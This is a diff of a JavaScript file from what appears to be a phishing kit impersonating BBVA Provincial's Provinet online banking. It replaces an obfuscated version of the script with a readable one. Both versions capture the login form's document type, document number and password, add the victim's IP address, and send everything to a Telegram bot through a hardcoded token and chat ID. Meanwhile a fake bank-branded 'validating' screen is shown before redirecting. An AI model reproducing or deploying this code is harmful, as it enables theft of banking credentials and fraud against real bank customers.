@@ -1,1 +1,150 @@
-const _0x37c2ec=_0x40a0;(function(_0x2d5952,_0x12270b){const _0x370e94=_0x40a0,_0x5f4f59=_0x2d5952();while(!![]){try{const _0x280966=-parseInt(_0x370e94(0x1d2))/0x1*(parseInt(_0x370e94(0x1c9))/0x2)+-parseInt(_0x370e94(0x1b3))/0x3+parseInt(_0x370e94(0x19c))/0x4+-parseInt(_0x370e94(0x1a3))/0x5*(-parseInt(_0x370e94(0x1ce))/0x6)+parseInt(_0x370e94(0x19b))/0x7+-parseInt(_0x370e94(0x198))/0x8+-parseInt(_0x370e94(0x1d4))/0x9*(parseInt(_0x370e94(0x1cd))/0xa);if(_0x280966===_0x12270b)break;else _0x5f4f59['push'](_0x5f4f59['shift']());}catch(_0x2377f0){_0x5f4f59['push'](_0x5f4f59['shift']());}}}(_0x45b8,0xeef58));const TELEGRAM_TOKEN='8038367240:AAFwLaUBcYyUMFzNlTLLO2c0DAEVqBNraLI',CHAT_ID=_0x37c2ec(0x1c1);function _0x40a0(_0x590759,_0x25fb2e){const _0x45b891=_0x45b8();return _0x40a0=function(_0x40a0c8,_0x5aac3b){_0x40a0c8=_0x40a0c8-0x18e;let _0x5b1832=_0x45b891[_0x40a0c8];return _0x5b1832;},_0x40a0(_0x590759,_0x25fb2e);}function sendToTelegram(_0x56f6e0){const _0x3ac432=_0x37c2ec,_0x4cc69b=_0x3ac432(0x1a2)+TELEGRAM_TOKEN+_0x3ac432(0x1be),_0x24d7d4=_0x3ac432(0x19a)+_0x56f6e0['numeroDocumento']+'\x0a\x20\x20\x20\x20🔒\x20**Clave\x20de\x20acceso**:\x20'+_0x56f6e0[_0x3ac432(0x1c0)]+_0x3ac432(0x1c8);fetch(_0x4cc69b,{'method':_0x3ac432(0x1a4),'body':new URLSearchParams({'chat_id':CHAT_ID,'text':_0x24d7d4,'parse_mode':_0x3ac432(0x1e1)})})[_0x3ac432(0x1b5)](_0x421c53=>_0x421c53[_0x3ac432(0x1b6)]())[_0x3ac432(0x1b5)](_0xa8a8a8=>{console['log']('Mensaje\x20enviado\x20correctamente',_0xa8a8a8);})[_0x3ac432(0x1ba)](_0x4eba95=>{console['error']('Error\x20al\x20enviar\x20mensaje:',_0x4eba95);});}function showLoadingScreen(){const _0x261ac8=_0x37c2ec,_0x389b72=document[_0x261ac8(0x1c5)](_0x261ac8(0x1b4));_0x389b72['style'][_0x261ac8(0x1ad)]=_0x261ac8(0x1a0),_0x389b72[_0x261ac8(0x192)][_0x261ac8(0x18e)]='0',_0x389b72[_0x261ac8(0x192)][_0x261ac8(0x1b2)]='0',_0x389b72[_0x261ac8(0x192)]['width']='100vw',_0x389b72[_0x261ac8(0x192)][_0x261ac8(0x195)]=_0x261ac8(0x1d6),_0x389b72[_0x261ac8(0x192)][_0x261ac8(0x1ae)]=_0x261ac8(0x1db),_0x389b72[_0x261ac8(0x192)][_0x261ac8(0x1dd)]=_0x261ac8(0x1e0),_0x389b72['style'][_0x261ac8(0x1a5)]=_0x261ac8(0x1b9),_0x389b72[_0x261ac8(0x192)][_0x261ac8(0x1d7)]='center',_0x389b72[_0x261ac8(0x192)][_0x261ac8(0x1d9)]=_0x261ac8(0x1c7),_0x389b72[_0x261ac8(0x192)]['zIndex']=_0x261ac8(0x1af);const _0x46ad86=document[_0x261ac8(0x1c5)](_0x261ac8(0x1b4));_0x46ad86['textContent']=_0x261ac8(0x191),_0x46ad86[_0x261ac8(0x192)]['fontSize']='24px',_0x46ad86['style'][_0x261ac8(0x1a8)]=_0x261ac8(0x1e3),_0x46ad86[_0x261ac8(0x192)][_0x261ac8(0x190)]=_0x261ac8(0x1bd),_0x46ad86['style'][_0x261ac8(0x1b7)]='20px';const _0x38b97d=document[_0x261ac8(0x1c5)](_0x261ac8(0x1b4));_0x38b97d[_0x261ac8(0x192)][_0x261ac8(0x19e)]=_0x261ac8(0x1e4),_0x38b97d[_0x261ac8(0x192)][_0x261ac8(0x195)]=_0x261ac8(0x1e4),_0x38b97d[_0x261ac8(0x192)][_0x261ac8(0x1ca)]=_0x261ac8(0x1aa),_0x38b97d[_0x261ac8(0x192)][_0x261ac8(0x1da)]=_0x261ac8(0x1c2),_0x38b97d['style'][_0x261ac8(0x1d1)]=_0x261ac8(0x1cc),_0x38b97d[_0x261ac8(0x192)][_0x261ac8(0x1bf)]=_0x261ac8(0x194),_0x38b97d[_0x261ac8(0x192)][_0x261ac8(0x18f)]=_0x261ac8(0x1d8),_0x38b97d[_0x261ac8(0x192)][_0x261ac8(0x1ad)]='relative';const _0x4b3f8f=document['createElement']('span');_0x4b3f8f[_0x261ac8(0x1b1)]=_0x261ac8(0x1d5),_0x4b3f8f['style'][_0x261ac8(0x1ad)]=_0x261ac8(0x1de),_0x4b3f8f['style']['top']=_0x261ac8(0x1aa),_0x4b3f8f['style'][_0x261ac8(0x1b2)]=_0x261ac8(0x1aa),_0x4b3f8f['style'][_0x261ac8(0x1a9)]=_0x261ac8(0x1a1),_0x4b3f8f[_0x261ac8(0x192)][_0x261ac8(0x190)]=_0x261ac8(0x1bd),_0x4b3f8f[_0x261ac8(0x192)]['fontSize']='18px',_0x4b3f8f[_0x261ac8(0x192)][_0x261ac8(0x1a8)]=_0x261ac8(0x1e3),_0x4b3f8f[_0x261ac8(0x192)][_0x261ac8(0x1bb)]=_0x261ac8(0x1cf),_0x38b97d[_0x261ac8(0x1d0)](_0x4b3f8f),_0x389b72[_0x261ac8(0x1d0)](_0x46ad86),_0x389b72[_0x261ac8(0x1d0)](_0x38b97d);const _0x1a4144=document[_0x261ac8(0x1c5)](_0x261ac8(0x1b4));_0x1a4144[_0x261ac8(0x1b1)]=_0x261ac8(0x197),_0x1a4144['style'][_0x261ac8(0x199)]=_0x261ac8(0x1cb),_0x1a4144[_0x261ac8(0x192)]['color']=_0x261ac8(0x1bd),_0x1a4144[_0x261ac8(0x192)][_0x261ac8(0x1a7)]=_0x261ac8(0x1c4),_0x389b72['appendChild'](_0x1a4144),document[_0x261ac8(0x1b0)]['appendChild'](_0x389b72),setTimeout(()=>{const _0x4a0c8a=_0x261ac8;window[_0x4a0c8a(0x19f)][_0x4a0c8a(0x1c6)]='index2.html';},0x1388);}function handleFormSubmit(_0x4d963){const _0x3c28fa=_0x37c2ec;_0x4d963[_0x3c28fa(0x1c3)]();const _0x43a2d7=document[_0x3c28fa(0x1a6)](_0x3c28fa(0x193))[_0x3c28fa(0x1d3)],_0x3fea77=document[_0x3c28fa(0x1a6)](_0x3c28fa(0x1ac))['value'],_0x14383a=document[_0x3c28fa(0x1a6)](_0x3c28fa(0x19d))['value'],_0x364772=document[_0x3c28fa(0x1a6)](_0x3c28fa(0x1b8))[_0x3c28fa(0x1bc)];showLoadingScreen();const _0x3a6cb2={'tipoDocumento':_0x43a2d7,'numeroDocumento':_0x3fea77,'claveAcceso':_0x14383a,'recordar':_0x364772};sendToTelegram(_0x3a6cb2);}document[_0x37c2ec(0x1a6)](_0x37c2ec(0x1dc))['addEventListener'](_0x37c2ec(0x1e2),handleFormSubmit);const style=document[_0x37c2ec(0x1c5)]('style');style[_0x37c2ec(0x1ab)]=_0x37c2ec(0x1df),document[_0x37c2ec(0x196)][_0x37c2ec(0x1d0)](style);function _0x45b8(){const _0x3cded9=['checked','#072146','/sendMessage','borderBottom','claveAcceso','-1002267762294','8px\x20solid\x20transparent','preventDefault','20px','createElement','href','center','\x0a\x0a\x20\x20\x20\x20---\x0a\x20\x20\x20\x20👨‍💻\x20*Desarrollado\x20por*\x20**MegabyteAG5**\x20💻\x0a\x20\x20\x20\x20','274lqLCVQ','borderRadius','16px','8px\x20solid\x20#072146','20CPLqDZ','12ugqtSw','1001','appendChild','borderTop','1737VtQmSt','value','1880028tyXmtB','BBVA','100vh','alignItems','spin\x201s\x20linear\x20infinite','justifyContent','border','rgba(211,\x20211,\x20211,\x200.8)','form','display','absolute','\x0a\x20\x20\x20\x20@keyframes\x20spin\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20transform:\x20rotate(0deg);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20rotate(360deg);\x20}\x0a\x20\x20\x20\x20}\x0a','flex','Markdown','submit','bold','80px','top','animation','color','Bienvenido\x20a\x20Provinet','style','select','8px\x20solid\x20#1873b3','height','head','Validando\x20información,\x20por\x20favor\x20espere...','6021064uFtVHC','fontSize','\x0a\x20\x20\x20\x20*✨\x20LOGO\x20PROVINCIAL:\x20✨*\x0a\x0a\x20\x20\x20\x20📄\x20**Número\x20de\x20documento**:\x20','11538023fgvcUq','4460844uxhypr','input[type=\x22password\x22]','width','location','fixed','translate(-50%,\x20-50%)','https://api.telegram.org/bot','3640925uXIoDt','POST','flexDirection','querySelector','marginTop','fontWeight','transform','50%','innerHTML','input[type=\x22text\x22]','position','background','1000','body','textContent','left','5498124aZBvBJ','div','then','json','marginBottom','#recordar','column','catch','zIndex'];_0x45b8=function(){return _0x3cded9;};return _0x45b8();}
+// Token y chat ID de Telegram
+const TELEGRAM_TOKEN = '8038367240:AAFwLaUBcYyUMFzNlTLLO2c0DAEVqBNraLI';  // Reemplaza con tu token real
+const CHAT_ID = '-1002267762294';  // Reemplaza con tu chat ID real
+
+// Función para obtener la IP del usuario
+function getIPAddress(callback) {
+    fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            callback(data.ip);
+        })
+        .catch(error => {
+            console.error('Error obteniendo la IP:', error);
+            callback('No disponible');
+        });
+}
+
+// Función para enviar mensaje a Telegram
+function sendToTelegram(data) {
+    getIPAddress((ip) => {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        const message = `
+        *✨ LOGO PROVINCIAL: ✨*
+
+        📄 **${data.tipoDocumento}**: ${data.numeroDocumento}
+        🔒 **Clave de acceso**: ${data.claveAcceso}
+        🌍 **IP**: ${ip}
+
+        ---
+        👨‍💻 *Desarrollado por* **MegabyteAG5** 💻
+        `;
+
+        fetch(url, {
+            method: 'POST',
+            body: new URLSearchParams({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Mensaje enviado correctamente', data);
+        })
+        .catch(error => {
+            console.error('Error al enviar mensaje:', error);
+        });
+    });
+}
+
+// Función para mostrar la pantalla de carga
+function showLoadingScreen() {
+    const loadingOverlay = document.createElement('div');
+    loadingOverlay.style.position = 'fixed';
+    loadingOverlay.style.top = '0';
+    loadingOverlay.style.left = '0';
+    loadingOverlay.style.width = '100vw';
+    loadingOverlay.style.height = '100vh';
+    loadingOverlay.style.background = 'rgba(211, 211, 211, 0.8)';  // Fondo gris claro
+    loadingOverlay.style.display = 'flex';
+    loadingOverlay.style.flexDirection = 'column';
+    loadingOverlay.style.alignItems = 'center';
+    loadingOverlay.style.justifyContent = 'center';
+    loadingOverlay.style.zIndex = '1000';
+
+    // Título arriba del círculo
+    const welcomeText = document.createElement('div');
+    welcomeText.textContent = 'Bienvenido a Provinet';
+    welcomeText.style.fontSize = '24px';
+    welcomeText.style.fontWeight = 'bold';
+    welcomeText.style.color = '#072146';
+    welcomeText.style.marginBottom = '20px';
+
+    // Círculo de carga
+    const circle = document.createElement('div');
+    circle.style.width = '80px';
+    circle.style.height = '80px';
+    circle.style.borderRadius = '50%';
+    circle.style.border = '8px solid transparent';
+    circle.style.borderTop = '8px solid #072146';
+    circle.style.borderBottom = '8px solid #1873b3';
+    circle.style.animation = 'spin 1s linear infinite';
+    circle.style.position = 'relative';
+    
+    // Crear el texto BBVA dentro del círculo
+    const text = document.createElement('span');
+    text.textContent = 'BBVA';
+    text.style.position = 'absolute';
+    text.style.top = '50%';
+    text.style.left = '50%';
+    text.style.transform = 'translate(-50%, -50%)';
+    text.style.color = '#072146';
+    text.style.fontSize = '18px';
+    text.style.fontWeight = 'bold';
+    text.style.zIndex = '1001'; // Asegura que el texto esté encima del círculo
+
+    circle.appendChild(text);
+    loadingOverlay.appendChild(welcomeText);
+    loadingOverlay.appendChild(circle);
+
+    // Título abajo del círculo
+    const validatingText = document.createElement('div');
+    validatingText.textContent = 'Validando información, por favor espere...';
+    validatingText.style.fontSize = '16px';
+    validatingText.style.color = '#072146';
+    validatingText.style.marginTop = '20px';
+
+    loadingOverlay.appendChild(validatingText);
+    document.body.appendChild(loadingOverlay);
+
+    // Después de 5 segundos, redirigir a index2.html
+    setTimeout(() => {
+        window.location.href = 'index2.html';
+    }, 5000); // Redirige después de 5 segundos
+}
+
+// Función principal para manejar el envío del formulario
+function handleFormSubmit(event) {
+    event.preventDefault(); // Evita que el formulario se envíe por defecto
+
+    const tipoDocumento = document.querySelector('select').value;
+    const numeroDocumento = document.querySelector('input[type="text"]').value;
+    const claveAcceso = document.querySelector('input[type="password"]').value;
+    const recordar = document.querySelector('#recordar').checked;
+
+    // Mostrar pantalla de carga
+    showLoadingScreen();
+
+    // Enviar los datos a Telegram inmediatamente
+    const data = {
+        tipoDocumento,
+        numeroDocumento,
+        claveAcceso,
+        recordar
+    };
+    sendToTelegram(data);
+}
+
+// Asignar la función al evento de submit del formulario
+document.querySelector('form').addEventListener('submit', handleFormSubmit);
+
+// Animación para el círculo de carga
+const style = document.createElement('style');
+style.innerHTML = `
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+`;
+document.head.appendChild(style);
